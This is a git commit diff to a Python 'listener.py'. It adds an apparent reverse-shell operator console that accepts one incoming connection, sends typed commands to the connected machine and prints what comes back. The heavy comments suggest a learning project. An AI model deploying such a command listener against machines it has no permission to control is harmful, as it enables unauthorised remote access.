e4eb63cdbfbd12e268a141e931eaccec94c783cb
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2019-08-16 16:13:06 -0700

    Update listener.py

--- listener.py
+++ listener.py
@@ -10,8 +10,21 @@ listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 #setsockopt = method for setting socket options
 #(level, attribute, value)
 #this allows reuse of sockets, so they will persist through lost connection
+
 listener.bind((listen_ip, listen_port))
 listener.listen(0) #specify backlog - number of connections that can be queued before it resets
-print("[+] Listening for incoming connections on ", listen_ip, listen_port)
-listener.accept() #needed to allow connection on the specified IP and port
-print("[+] Connection established")
+print("[+] Listening for incoming connections on ", listen_ip, "Port:", listen_port)
+#listener.accept() - needed to allow connection on the specified IP and port
+
+#listener.accept - the accept method of the socket method returns two values:
+connection, address = listener.accept()
+#first value - "connection" - socket object representing connection used to send or receive data
+#second value - "addresss" - address bound to the connection
+
+print("[+] Connection established from", str(address))
+
+while True:
+    command = input(">> ")
+    connection.send(command)
+    result = connection.recv(1024) #receive result in 1024 chunks
+    print(result)
